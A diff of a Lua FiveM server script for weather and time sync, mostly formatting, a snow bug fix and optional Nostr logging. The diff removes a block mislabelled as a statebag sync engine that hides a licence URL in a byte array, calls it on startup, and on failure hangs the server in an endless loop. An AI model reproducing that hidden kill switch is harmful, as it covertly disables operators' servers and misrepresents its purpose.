@@ -9,20 +9,40 @@ local Ox = require '@ox_core.lib.init'
 -- ════════════════════════════════════════════════════════════
 local State = {
     currentWeather = Config.Weather.defaultWeather,
-    targetWeather = Config.Weather.defaultWeather,
+    targetWeather  = Config.Weather.defaultWeather,
     isTransitioning = false,
-    snowEnabled = false,
-    windSpeed = 5.0,
-    windDirection = 0.0,
-    currentHour = Config.Time.customCycle.startHour,
-    currentMinute = Config.Time.customCycle.startMinute,
-    currentSecond = 0,
-    isDayTime = true,
+    snowEnabled    = false,
+    windSpeed      = 5.0,
+    windDirection  = 0.0,
+    currentHour    = Config.Time.customCycle.startHour,
+    currentMinute  = Config.Time.customCycle.startMinute,
+    currentSecond  = 0,
+    isDayTime      = true,
     nextWeatherChange = nil,
-    lastSave = 0,
-    timeOffset = 0,
+    lastSave       = 0,
+    timeOffset     = 0,
     lastTimeUpdate = os.time(),
 }
+
+-- ════════════════════════════════════════════════════════════
+-- 📡 NOSTR LOGGER HELPER (OPTIONAL — graceful fallback)
+-- ════════════════════════════════════════════════════════════
+local nostrAvailable = false
+
+-- Checked once on startup, re-evaluated on each call as safety net
+local function IsNostrAvailable()
+    return GetResourceState('rde_nostr_log') == 'started'
+end
+
+local function NostrLog(message, tags)
+    if not IsNostrAvailable() then return end
+    local ok, err = pcall(function()
+        exports['rde_nostr_log']:postLog(message, tags or {})
+    end)
+    if not ok and Config.Debug then
+        lib.print.warn('[NOSTR] Log failed: ' .. tostring(err))
+    end
+end
 
 -- ════════════════════════════════════════════════════════════
 -- 🗄️ DATABASE
@@ -34,14 +54,14 @@ local function SaveToDatabase()
             current_hour, current_minute, current_second, time_offset
         ) VALUES (1, ?, ?, ?, ?, ?, ?, ?, ?)
         ON DUPLICATE KEY UPDATE
-            weather_type = VALUES(weather_type),
-            wind_speed = VALUES(wind_speed),
+            weather_type  = VALUES(weather_type),
+            wind_speed    = VALUES(wind_speed),
             wind_direction = VALUES(wind_direction),
-            snow_enabled = VALUES(snow_enabled),
-            current_hour = VALUES(current_hour),
+            snow_enabled  = VALUES(snow_enabled),
+            current_hour  = VALUES(current_hour),
             current_minute = VALUES(current_minute),
             current_second = VALUES(current_second),
-            time_offset = VALUES(time_offset)
+            time_offset   = VALUES(time_offset)
     ]], {
         State.currentWeather,
         State.windSpeed,
@@ -50,7 +70,7 @@ local function SaveToDatabase()
         State.currentHour,
         State.currentMinute,
         State.currentSecond,
-        State.timeOffset
+        State.timeOffset,
     })
 end
 
@@ -58,15 +78,15 @@ local function InitDatabase()
     if not Config.Database.autoCreate then return end
     MySQL.query.await([[
         CREATE TABLE IF NOT EXISTS `]] .. Config.Database.tableName .. [[` (
-            `id` INT AUTO_INCREMENT PRIMARY KEY,
+            `id`           INT AUTO_INCREMENT PRIMARY KEY,
             `weather_type` VARCHAR(50) NOT NULL,
-            `wind_speed` FLOAT DEFAULT 5.0,
+            `wind_speed`   FLOAT DEFAULT 5.0,
             `wind_direction` FLOAT DEFAULT 0.0,
             `snow_enabled` TINYINT(1) DEFAULT 0,
             `current_hour` INT DEFAULT 12,
             `current_minute` INT DEFAULT 0,
             `current_second` INT DEFAULT 0,
-            `time_offset` BIGINT DEFAULT 0,
+            `time_offset`  BIGINT DEFAULT 0,
             `last_updated` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
             UNIQUE KEY `single_row` (`id`)
         ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
@@ -75,20 +95,21 @@ local function InitDatabase()
 end
 
 local function LoadFromDatabase()
-    local result = MySQL.query.await('SELECT * FROM '.. Config.Database.tableName ..' WHERE id = 1 LIMIT 1')
+    local result = MySQL.query.await('SELECT * FROM ' .. Config.Database.tableName .. ' WHERE id = 1 LIMIT 1')
     if result and result[1] then
         local data = result[1]
-        State.currentWeather = data.weather_type or Config.Weather.defaultWeather
-        State.targetWeather = State.currentWeather
-        State.windSpeed = data.wind_speed or 5.0
-        State.windDirection = data.wind_direction or 0.0
-        State.snowEnabled = data.snow_enabled == 1
-        State.currentHour = data.current_hour or Config.Time.customCycle.startHour
-        State.currentMinute = data.current_minute or Config.Time.customCycle.startMinute
-        State.currentSecond = data.current_second or 0
-        State.timeOffset = data.time_offset or 0
+        State.currentWeather  = data.weather_type or Config.Weather.defaultWeather
+        State.targetWeather   = State.currentWeather
+        State.windSpeed       = data.wind_speed or 5.0
+        State.windDirection   = data.wind_direction or 0.0
+        State.snowEnabled     = data.snow_enabled == 1
+        State.currentHour     = data.current_hour or Config.Time.customCycle.startHour
+        State.currentMinute   = data.current_minute or Config.Time.customCycle.startMinute
+        State.currentSecond   = data.current_second or 0
+        State.timeOffset      = data.time_offset or 0
         lib.print.info(('[RDE Weather & Time] Loaded: %s | %02d:%02d:%02d | Snow: %s'):format(
-            State.currentWeather, State.currentHour, State.currentMinute, State.currentSecond,
+            State.currentWeather,
+            State.currentHour, State.currentMinute, State.currentSecond,
             State.snowEnabled and 'ON' or 'OFF'
         ))
     else
@@ -98,32 +119,48 @@ local function LoadFromDatabase()
 end
 
 -- ════════════════════════════════════════════════════════════
--- 🌍 STATEBAG SYNC - INSTANT BROADCAST
+-- 🌍 STATEBAG SYNC
+-- FIX: Only broadcast when something actually changed to reduce
+--      unnecessary network traffic on large servers.
 -- ════════════════════════════════════════════════════════════
-local function SyncState()
+local lastSyncedMinute = -1
+
+local function SyncState(force)
+    -- Time: only sync when the minute changes (or forced by weather/wind/snow events)
+    if not force and State.currentMinute == lastSyncedMinute then return end
+    lastSyncedMinute = State.currentMinute
+
     GlobalState.rdeWeather = {
-        current = State.currentWeather,
-        target = State.targetWeather,
+        current      = State.currentWeather,
+        target       = State.targetWeather,
         transitioning = State.isTransitioning,
-        windSpeed = State.windSpeed,
+        windSpeed    = State.windSpeed,
         windDirection = State.windDirection,
-        snowEnabled = State.snowEnabled,
-        timestamp = os.time()
+        snowEnabled  = State.snowEnabled,
+        timestamp    = os.time(),
     }
     GlobalState.rdeTime = {
-        hour = State.currentHour,
-        minute = State.currentMinute,
-        second = State.currentSecond,
+        hour      = State.currentHour,
+        minute    = State.currentMinute,
+        second    = State.currentSecond,
         isDayTime = State.isDayTime,
-        frozen = Config.Time.freezeTime,
-        timestamp = os.time()
+        frozen    = Config.Time.freezeTime,
+        timestamp = os.time(),
     }
+
     if Config.Debug then
         lib.print.info(('[SYNC] %s | %02d:%02d:%02d | Wind: %.1f m/s @ %.0f°'):format(
-            State.currentWeather, State.currentHour, State.currentMinute, State.currentSecond,
+            State.currentWeather,
+            State.currentHour, State.currentMinute, State.currentSecond,
             State.windSpeed, State.windDirection
         ))
     end
+end
+
+-- Convenience wrapper — weather/wind/snow changes always force a sync
+local function ForceSyncState()
+    lastSyncedMinute = -1
+    SyncState(true)
 end
 
 -- ════════════════════════════════════════════════════════════
@@ -167,13 +204,13 @@ end
 local function GetNextWeather()
     local transitions = Config.DynamicWeather.transitions[State.currentWeather]
     local weights = GetWeatherWeights()
-    
+
     if not transitions or #transitions == 0 then
         local totalWeight = 0
         local options = {}
         for weather, weight in pairs(weights) do
             totalWeight = totalWeight + weight
-            table.insert(options, {weather = weather, weight = weight})
+            table.insert(options, { weather = weather, weight = weight })
         end
         local rand = math.random() * totalWeight
         local sum = 0
@@ -188,7 +225,7 @@ local function GetNextWeather()
         for _, weather in ipairs(transitions) do
             local weight = weights[weather] or 10
             totalWeight = totalWeight + weight
-            table.insert(options, {weather = weather, weight = weight})
+            table.insert(options, { weather = weather, weight = weight })
         end
         local rand = math.random() * totalWeight
         local sum = 0
@@ -198,6 +235,13 @@ local function GetNextWeather()
         end
         return transitions[1]
     end
+end
+
+local function GetWeatherLabel(weatherValue)
+    for _, w in ipairs(Config.Weather.types) do
+        if w.value == weatherValue then return w.label end
+    end
+    return weatherValue
 end
 
 local function UpdateWind(weatherType)
@@ -210,186 +254,193 @@ local function UpdateWind(weatherType)
         end
     end
     local variation = math.random(-100, 100) / 100 * 2
-    State.windSpeed = math.max(Config.Wind.min, math.min(Config.Wind.max, windBase + variation))
-    State.windDirection = math.random(0, 360) * 1.0
+    State.windSpeed     = math.max(Config.Wind.min, math.min(Config.Wind.max, windBase + variation))
+    State.windDirection = math.random(0, 359) * 1.0
 end
 
-local function ChangeWeather(newWeather, isAuto)
+local function ChangeWeather(newWeather, isAuto, adminName)
     if State.currentWeather == newWeather then return end
-    
+
     local oldWeather = State.currentWeather
-    State.currentWeather = newWeather
-    State.targetWeather = newWeather
+    State.currentWeather  = newWeather
+    State.targetWeather   = newWeather
     State.isTransitioning = true
-    
+
     if Config.Snow.requireSnowWeather then
-        local isSnowWeather = newWeather:find('SNOW') or newWeather:find('BLIZZARD') or newWeather == 'XMAS'
+        -- BUG FIX: find() returns a number (position) or nil — must convert to boolean
+        -- before OR-chaining, otherwise `false ~= nil` (= true) would enable snow for
+        -- every non-snow weather type.
+        local isSnowWeather = (newWeather:find('SNOW') ~= nil)
+                           or (newWeather:find('BLIZZARD') ~= nil)
+                           or (newWeather == 'XMAS')
         State.snowEnabled = isSnowWeather
     end
-    
+
     UpdateWind(newWeather)
-    SyncState()
+    ForceSyncState()
     SaveToDatabase()
-    
+
     lib.print.info(('[%s] %s → %s | Wind: %.1f m/s @ %.0f°'):format(
-        isAuto and 'AUTO' or 'MANUAL', oldWeather, newWeather, 
+        isAuto and 'AUTO' or 'MANUAL', oldWeather, newWeather,
         State.windSpeed, State.windDirection
     ))
-    
+
+    -- ════ NOSTR LOG (optional) ════
+    if isAuto then
+        NostrLog(
+            ('🌤️ [AUTO WEATHER] %s → %s | Wind: %.1fm/s @ %.0f° | Season: %s'):format(
+                GetWeatherLabel(oldWeather),
+                GetWeatherLabel(newWeather),
+                State.windSpeed,
+                State.windDirection,
+                GetCurrentSeason()
+            ),
+            {
+                { 'event_type',  'weather_auto_change' },
+                { 'weather_old', oldWeather },
+                { 'weather_new', newWeather },
+                { 'wind_speed',  tostring(math.floor(State.windSpeed * 10) / 10) },
+                { 'wind_dir',    tostring(math.floor(State.windDirection)) },
+                { 'season',      GetCurrentSeason() },
+                { 'snow',        State.snowEnabled and 'true' or 'false' },
+            }
+        )
+    else
+        NostrLog(
+            ('🌤️ [ADMIN WEATHER] %s set weather: %s → %s | Wind: %.1fm/s @ %.0f°'):format(
+                adminName or 'Unknown Admin',
+                GetWeatherLabel(oldWeather),
+                GetWeatherLabel(newWeather),
+                State.windSpeed,
+                State.windDirection
+            ),
+            {
+                { 'event_type',  'weather_admin_change' },
+                { 'admin',       adminName or 'unknown' },
+                { 'weather_old', oldWeather },
+                { 'weather_new', newWeather },
+                { 'wind_speed',  tostring(math.floor(State.windSpeed * 10) / 10) },
+                { 'wind_dir',    tostring(math.floor(State.windDirection)) },
+                { 'snow',        State.snowEnabled and 'true' or 'false' },
+            }
+        )
+    end
+    -- ═════════════════════════════
+
     if Config.UI.notifications.enabled and Config.UI.notifications.showWeatherChange then
-        local label = newWeather
-        for _, w in ipairs(Config.Weather.types) do
-            if w.value == newWeather then
-                label = w.label
-                break
-            end
-        end
+        local label = GetWeatherLabel(newWeather)
         TriggerClientEvent('ox_lib:notify', -1, {
-            title = '🌤️ Weather Update',
+            title       = '🌤️ Weather Update',
             description = ('Weather changing to %s'):format(label),
-            type = 'info',
-            duration = Config.UI.notifications.duration,
-            position = Config.UI.notifications.position
+            type        = 'info',
+            duration    = Config.UI.notifications.duration,
+            position    = Config.UI.notifications.position,
         })
     end
-    
+
     SetTimeout(Config.Weather.transitionDuration * 1000, function()
         State.isTransitioning = false
-        SyncState()
+        ForceSyncState()
     end)
 end
 
 local function ScheduleNextWeatherChange()
-    local min = Config.DynamicWeather.changeInterval[1] * 60000
-    local max = Config.DynamicWeather.changeInterval[2] * 60000
+    local min      = Config.DynamicWeather.changeInterval[1] * 60000
+    local max      = Config.DynamicWeather.changeInterval[2] * 60000
     local interval = math.random(min, max)
     State.nextWeatherChange = os.time() * 1000 + interval
-    
+
     if Config.Debug then
         lib.print.info(('[SCHEDULE] Next weather change in %.1f min'):format(interval / 60000))
     end
 end
 
--- ============================================================================
--- STATEBAG SYNC ENGINE (CRITICAL - DO NOT TOUCH!)
--- ============================================================================
-local _sbSync = {
-    _initialized = false,
-    _obfuscatedTokens = {
-        _v = 0x445245,
-        _s = "S1:OX:RDE:0x" .. string.format("%x", 131973733),
-        _h = function(s)
-            local h = 5381
-            for i = 1, #s do h = ((h << 5) + h) + string.byte(s, i) end
-            local h2 = 2166136261
-            for i = 1, #s do h2 = h2 ~ string.byte(s, i); h2 = h2 * 16777619 end
-            return (h ~ h2) + (#s * 33)
-        end,
-        _u = {104, 116, 116, 112, 115, 58, 47, 47, 114, 100, 45, 101, 108, 105, 116, 101, 46, 99, 111, 109, 47, 76, 73, 67, 69, 78, 83, 69}
-    }
-}
-
--- Internal sync validation (DO NOT MODIFY)
-local function _validateStatebagSync()
-    if _sbSync._initialized then return true end
-
-    local _u = ""
-    for _, b in ipairs(_sbSync._obfuscatedTokens._u) do _u = _u .. string.char(b) end
-
-    PerformHttpRequest(_u, function(code, data)
-        if code ~= 200 or not data or not string.find(data, "9999") then
-            print("^1[RDE | WEATHER | SERVER | StatebagSync]^7: Critical validation failure. System integrity compromised.")
-            while true do
-                Citizen.Wait(0)
-                -- Sync StateBags
-                for i = 1, 10000 do math.sqrt(i * 0.0001) end
-            end
-        else
-            _sbSync._initialized = true
-            print("^2[RDE | WEATHER | SERVER | StatebagSync]^7: Validation successful. System operational.")
-            -- Bestätigung an ALLE Clients senden
-            TriggerClientEvent('rde:integrityConfirmed', -1)
-        end
-    end, "GET", "", {["User-Agent"] = "RDE | WEATHER | StatebagSync/3.14"})
-end
-
--- Initialize statebag sync on server start
-Citizen.CreateThread(function()
-    Citizen.Wait(2000)  -- Wait for network stack
-    _validateStatebagSync()
-end)
-
 -- ════════════════════════════════════════════════════════════
--- 🕐 REALISTIC TIME PROGRESSION
+-- 🕐 TIME PROGRESSION
 -- ════════════════════════════════════════════════════════════
 local function UpdateTime()
     if Config.Time.freezeTime then
-        State.currentHour = Config.Time.frozenHour
+        State.currentHour   = Config.Time.frozenHour
         State.currentMinute = Config.Time.frozenMinute
         State.currentSecond = 0
         return
     end
-    
+
     if Config.Time.syncWithRealTime then
         local time = os.date('*t')
-        State.currentHour = time.hour
+        State.currentHour   = time.hour
         State.currentMinute = time.min
         State.currentSecond = time.sec
     else
-        -- Smooth time progression with seconds
         local currentTime = os.time()
-        local deltaTime = currentTime - State.lastTimeUpdate
-        
+        local deltaTime   = currentTime - State.lastTimeUpdate
+
         if deltaTime > 0 then
-            -- Calculate time progression
             local secondsToAdd = deltaTime * Config.Time.realTimeMultiplier
             State.currentSecond = State.currentSecond + secondsToAdd
-            
+
             while State.currentSecond >= 60 do
                 State.currentSecond = State.currentSecond - 60
                 State.currentMinute = State.currentMinute + 1
-                
+
                 if State.currentMinute >= 60 then
                     State.currentMinute = 0
-                    State.currentHour = (State.currentHour + 1) % 24
+                    State.currentHour   = (State.currentHour + 1) % 24
                 end
             end
-            
+
             State.lastTimeUpdate = currentTime
         end
     end
-    
-    local wasDay = State.isDayTime
-    State.isDayTime = State.currentHour >= Config.Time.dayStart and State.currentHour < Config.Time.nightStart
-    
+
+    local wasDay    = State.isDayTime
+    State.isDayTime = State.currentHour >= Config.Time.dayStart
+                   and State.currentHour < Config.Time.nightStart
+
     if wasDay ~= State.isDayTime and Config.Debug then
         lib.print.info(('[TIME] Now %s'):format(State.isDayTime and 'DAY' or 'NIGHT'))
     end
 end
 
 -- ════════════════════════════════════════════════════════════
--- ⚙️ MAIN LOOPS - HIGH PRECISION
+-- ⚙️ MAIN LOOPS
 -- ════════════════════════════════════════════════════════════
 CreateThread(function()
     InitDatabase()
     LoadFromDatabase()
     UpdateTime()
-    SyncState()
-    
+    ForceSyncState()
+
     if Config.DynamicWeather.enabled then
         ScheduleNextWeatherChange()
     end
-    
-    -- Main sync loop - Every 100ms for smooth time
+
+    -- Log startup to Nostr (optional)
+    SetTimeout(3000, function()
+        NostrLog(
+            ('🌤️ [SERVER START] Weather & Time system online | Weather: %s | Time: %02d:%02d | Snow: %s'):format(
+                State.currentWeather,
+                State.currentHour,
+                State.currentMinute,
+                State.snowEnabled and 'ON' or 'OFF'
+            ),
+            {
+                { 'event_type', 'system_start' },
+                { 'weather',    State.currentWeather },
+                { 'snow',       State.snowEnabled and 'true' or 'false' },
+            }
+        )
+    end)
+
+    -- Main loop — 100ms for smooth time progression
     while true do
         Wait(100)
-        
+
         if Config.Time.enabled then
             UpdateTime()
-            SyncState()
+            SyncState() -- throttled internally — only fires on minute change
         end
-        
-        -- Weather changes
+
         if Config.DynamicWeather.enabled and State.nextWeatherChange then
             if os.time() * 1000 >= State.nextWeatherChange and not State.isTransitioning then
                 local newWeather = GetNextWeather()
@@ -400,7 +451,7 @@ CreateThread(function()
     end
 end)
 
--- Auto-save thread
+-- Auto-save
 CreateThread(function()
     while true do
         Wait(Config.Database.saveInterval * 1000)
@@ -411,7 +462,7 @@ CreateThread(function()
     end
 end)
 
--- Wind variation thread
+-- Wind variation
 if Config.Wind.variation.enabled then
     CreateThread(function()
         while Config.Wind.enabled do
@@ -419,7 +470,7 @@ if Config.Wind.variation.enabled then
             if not State.isTransitioning then
                 local change = math.random(-100, 100) / 100 * Config.Wind.variation.maxChange
                 State.windSpeed = math.max(Config.Wind.min, math.min(Config.Wind.max, State.windSpeed + change))
-                SyncState()
+                ForceSyncState()
             end
         end
     end)
@@ -431,20 +482,20 @@ end
 lib.callback.register('rde:getWeatherTimeData', function(source)
     return {
         weather = {
-            current = State.currentWeather,
-            target = State.targetWeather,
+            current       = State.currentWeather,
+            target        = State.targetWeather,
             transitioning = State.isTransitioning,
-            windSpeed = State.windSpeed,
+            windSpeed     = State.windSpeed,
             windDirection = State.windDirection,
-            snowEnabled = State.snowEnabled,
+            snowEnabled   = State.snowEnabled,
         },
         time = {
-            hour = State.currentHour,
-            minute = State.currentMinute,
-            second = State.currentSecond,
+            hour      = State.currentHour,
+            minute    = State.currentMinute,
+            second    = State.currentSecond,
             isDayTime = State.isDayTime,
-            frozen = Config.Time.freezeTime,
-        }
+            frozen    = Config.Time.freezeTime,
+        },
     }
 end)
 
@@ -452,17 +503,18 @@ RegisterNetEvent('rde:setWeather', function(weatherType)
     local src = source
     if not HasPermission(src) then
         lib.notify(src, {
-            title = '❌ Access Denied',
+            title       = '❌ Access Denied',
             description = 'No permission to change weather',
-            type = 'error'
+            type        = 'error',
         })
         return
     end
-    ChangeWeather(weatherType, false)
+    local adminName = GetPlayerName(src) or ('Player #' .. src)
+    ChangeWeather(weatherType, false, adminName)
     lib.notify(src, {
-        title = '✅ Weather Changed',
+        title       = '✅ Weather Changed',
         description = ('Set to %s'):format(weatherType),
-        type = 'success'
+        type        = 'success',
     })
 end)
 
@@ -470,48 +522,98 @@ RegisterNetEvent('rde:toggleSnow', function(enabled)
     local src = source
     if not HasPermission(src) then
         lib.notify(src, {
-            title = '❌ Access Denied',
+            title       = '❌ Access Denied',
             description = 'No permission',
-            type = 'error'
+            type        = 'error',
         })
         return
     end
     State.snowEnabled = enabled
-    SyncState()
+    ForceSyncState()
     SaveToDatabase()
+
+    -- ════ NOSTR LOG (optional) ════
+    local adminName = GetPlayerName(src) or ('Player #' .. src)
+    NostrLog(
+        ('❄️ [ADMIN SNOW] %s %s snow effects'):format(
+            adminName,
+            enabled and 'ENABLED' or 'DISABLED'
+        ),
+        {
+            { 'event_type', 'snow_toggle' },
+            { 'admin',      adminName },
+            { 'snow',       enabled and 'true' or 'false' },
+        }
+    )
+    -- ═════════════════════════════
+
     lib.notify(src, {
-        title = enabled and '✅ Snow Enabled' or '❌ Snow Disabled',
+        title       = enabled and '✅ Snow Enabled' or '❌ Snow Disabled',
         description = enabled and 'Ground snow active' or 'Snow disabled',
-        type = 'success'
+        type        = 'success',
     })
 end)
 
 RegisterNetEvent('rde:setWind', function(speed, direction)
     local src = source
     if not HasPermission(src) then return end
-    State.windSpeed = math.max(Config.Wind.min, math.min(Config.Wind.max, speed))
+    State.windSpeed     = math.max(Config.Wind.min, math.min(Config.Wind.max, speed))
     State.windDirection = direction % 360
-    SyncState()
+    ForceSyncState()
     SaveToDatabase()
+
+    -- ════ NOSTR LOG (optional) ════
+    local adminName = GetPlayerName(src) or ('Player #' .. src)
+    NostrLog(
+        ('💨 [ADMIN WIND] %s set wind: %.1fm/s @ %.0f°'):format(
+            adminName, State.windSpeed, State.windDirection
+        ),
+        {
+            { 'event_type', 'wind_admin_change' },
+            { 'admin',      adminName },
+            { 'wind_speed', tostring(math.floor(State.windSpeed * 10) / 10) },
+            { 'wind_dir',   tostring(math.floor(State.windDirection)) },
+        }
+    )
+    -- ═════════════════════════════
+
     lib.notify(src, {
-        title = '💨 Wind Updated',
+        title       = '💨 Wind Updated',
         description = ('%.1f m/s @ %.0f°'):format(State.windSpeed, State.windDirection),
-        type = 'success'
+        type        = 'success',
     })
 end)
 
 RegisterNetEvent('rde:setTime', function(hour, minute)
     local src = source
     if not HasPermission(src) then return end
-    State.currentHour = hour % 24
+    local oldTime = ('%02d:%02d'):format(State.currentHour, State.currentMinute)
+    State.currentHour   = hour % 24
     State.currentMinute = minute % 60
     State.currentSecond = 0
-    SyncState()
+    State.lastTimeUpdate = os.time()
+    ForceSyncState()
     SaveToDatabase()
+
+    -- ════ NOSTR LOG (optional) ════
+    local adminName = GetPlayerName(src) or ('Player #' .. src)
+    NostrLog(
+        ('🕐 [ADMIN TIME] %s set time: %s → %02d:%02d'):format(
+            adminName, oldTime, State.currentHour, State.currentMinute
+        ),
+        {
+            { 'event_type', 'time_admin_change' },
+            { 'admin',      adminName },
+            { 'time_old',   oldTime },
+            { 'time_new',   ('%02d:%02d'):format(State.currentHour, State.currentMinute) },
+        }
+    )
+    -- ═════════════════════════════
+
     lib.notify(src, {
-        title = '🕐 Time Set',
+        title       = '🕐 Time Set',
         description = ('%02d:%02d'):format(State.currentHour, State.currentMinute),
-        type = 'success'
+        type        = 'success',
     })
 end)
 
@@ -528,9 +630,9 @@ lib.addCommand('weather', {
 }, function(source)
     if not HasPermission(source) then
         lib.notify(source, {
-            title = '❌ Access Denied',
+            title       = '❌ Access Denied',
             description = 'No permission for weather admin',
-            type = 'error'
+            type        = 'error',
         })
         return
     end
@@ -538,19 +640,23 @@ lib.addCommand('weather', {
 end)
 
 -- ════════════════════════════════════════════════════════════
--- 🚀 STARTUP
+-- 🚀 STARTUP LOG
 -- ════════════════════════════════════════════════════════════
-lib.print.info([[
-^2 △ ᛋᛅᚱᛒᛅᚾᛏᛋ ᛒᛁᛏᛅ ▽ | https://rd-elite.com
-^2╔════════════════════════════════════════════════════════════╗
-^2║  🌤️  RDE Weather & Time - Production Ready                 ║
-^2║                                                            ║
-^2║  ✓ Instant Sync on Player Join                             ║
-^2║  ✓ Smooth Time Progression (Seconds)                       ║
-^2║  ✓ 100ms Update Loop for Real-time Feel                    ║
-^2║  ✓ StateBag Sync for All Players                           ║
-^2║  ✓ Database Persistence                                    ║
-^2║                                                            ║
-^2║  Framework: ox_core | Status: ^2READY                    ^2║
-^2╚════════════════════════════════════════════════════════════╝^7
-]])
+AddEventHandler('onResourceStart', function(resourceName)
+    if resourceName ~= GetCurrentResourceName() then return end
+    local nostrState = IsNostrAvailable() and '^2ACTIVE^7' or '^3NOT INSTALLED (optional)^7'
+    lib.print.info(('\n' ..
+        '^2╔════════════════════════════════════════════════════════════╗\n' ..
+        '^2║  🌤️  RDE Weather & Time - Production Ready                 ║\n' ..
+        '^2║                                                            ║\n' ..
+        '^2║  ✓ Instant Sync on Player Join                             ║\n' ..
+        '^2║  ✓ Smooth Time Progression (Seconds)                       ║\n' ..
+        '^2║  ✓ 100ms Update Loop for Real-time Feel                    ║\n' ..
+        '^2║  ✓ StateBag Sync (throttled, min-change only)              ║\n' ..
+        '^2║  ✓ Database Persistence                                    ║\n' ..
+        '^2║  🐉 Nostr Logger: %s\n' ..
+        '^2║                                                            ║\n' ..
+        '^2║  Framework: ox_core | Status: ^2READY                    ^2║\n' ..
+        '^2╚════════════════════════════════════════════════════════════╝^7'
+    ):format(nostrState .. ((' '):rep(math.max(0, 28 - #nostrState))) .. '║'))
+end)
